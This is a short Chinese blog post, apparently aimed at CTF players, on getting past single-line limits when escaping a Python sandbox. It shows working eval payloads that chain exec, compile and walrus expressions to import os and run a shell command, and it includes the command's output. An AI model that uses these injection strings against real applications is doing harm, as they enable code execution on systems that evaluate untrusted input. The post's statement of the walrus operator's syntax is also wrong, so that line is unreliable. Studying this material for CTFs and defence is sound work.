> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [dummykitty.github.io](https://dummykitty.github.io/posts/pyjail-bypass-04-%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6/)

> 绕过多行限制 绕过多行限制的利用手法通常在限制了单行代码的情况下使用, 例如 eval, 中间如果存在；或者换行会报错。

绕过多行限制[](#绕过多行限制)
-----------------

绕过多行限制的利用手法通常在限制了单行代码的情况下使用, 例如 eval, 中间如果存在；或者换行会报错。

```
>>> eval("__import__('os');print(1)")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    __import__('os');print(1)
```

### exec[](#exec)

exec 可以支持换行符与`;`

```
>>> eval("exec('__import__(\"os\")\\nprint(1)')")
```

### compile[](#compile)

compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码.

```
eval('''eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec'))''')
```

### 海象表达式[](#海象表达式)

海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。

海象表达式的语法形式如下：

```
<expression> := <value> if <condition> else <value>
```

借助海象表达式，我们可以通过列表来替代多行代码：

```
>>> eval('[a:=__import__("os"),b:=a.system("id")]')
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[<module 'os' (frozen)>, 0]
```

参考资料[](#参考资料)
-------------

*   [Python 沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
*   [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
*   [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
*   [python 沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
*   [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
*   [[PyJail] python 沙箱逃逸探究 · 上（HNCTF 题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
*   [[PyJail] python 沙箱逃逸探究 · 中（HNCTF 题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
*   [[PyJail] python 沙箱逃逸探究 · 下（HNCTF 题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
*   [audited2](https://ctftime.org/writeup/31883)
*   [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
*   [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
*   [Python 沙箱逃逸的 n 种姿势](https://ctftime.org/writeup/28286)
*   [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.